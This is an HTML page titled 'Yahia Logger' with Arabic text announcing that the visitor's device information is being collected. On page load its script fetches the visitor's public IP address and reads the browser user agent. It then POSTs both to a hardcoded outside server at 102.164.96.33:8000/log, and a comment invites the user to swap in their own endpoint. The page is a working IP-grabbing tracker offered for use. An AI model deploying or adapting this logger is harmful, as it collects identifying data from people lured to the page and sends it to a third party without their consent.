<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Yahia Logger</title>
    <style>
        body {
            background: #000;
            color: #0f0;
            font-family: monospace;
            padding: 20px;
        }
        b {
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h1><b>[ + ]</b> أهلاً بك في Logger Yahia</h1>
    <p><b>[ + ]</b> يتم الآن جمع معلومات جهازك...</p>
    <p><b>[ + ]</b> جميع الحقوق محفوظة لـ Yahia</p>

    <script>
        async function sendData() {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            const ip = data.ip;

            const userAgent = navigator.userAgent;

            const payload = {
                ip: ip,
                user_agent: userAgent
            };

            fetch('http://102.164.96.33:8000/log', {  // غيّر الرابط حسب API حقك
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            }).then(res => {
                console.log('[ + ] Sent to server');
            }).catch(err => {
                console.error('[ + ] Failed to send:', err);
            });
        }

        sendData();
    </script>
</body>
</html>
